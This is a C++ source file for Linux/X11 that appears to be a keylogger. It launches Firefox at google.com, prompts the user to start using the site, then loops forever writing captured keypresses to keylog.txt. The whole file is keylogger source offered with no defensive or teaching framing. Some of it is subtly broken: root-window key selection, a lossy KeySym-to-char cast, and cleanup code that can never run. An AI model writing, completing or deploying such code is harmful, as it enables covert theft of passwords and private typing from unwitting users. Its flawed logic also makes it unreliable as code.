#include <iostream>
#include <fstream>
#include <X11/Xlib.h>
#include <unistd.h>

int main() {
    Display *display = XOpenDisplay(NULL);
    Window root = DefaultRootWindow(display);
    XSelectInput(display, root, KeyPressMask);

    std::ofstream log_file("keylog.txt");

    // Open Google website
    system("firefox https://www.google.com");
    std::cout << "Start using Google.com" << std::endl;
    sleep(5); // wait for 5 seconds for the user to start interacting with the website

    while (true) {
        XEvent event;
        XNextEvent(display, &event);
        if (event.type == KeyPress) {
            char key = XLookupKeysym(&event.xkey, 0);
            log_file << key;
        }
    }
    log_file.close();
    XCloseDisplay(display);
    return 0;
}
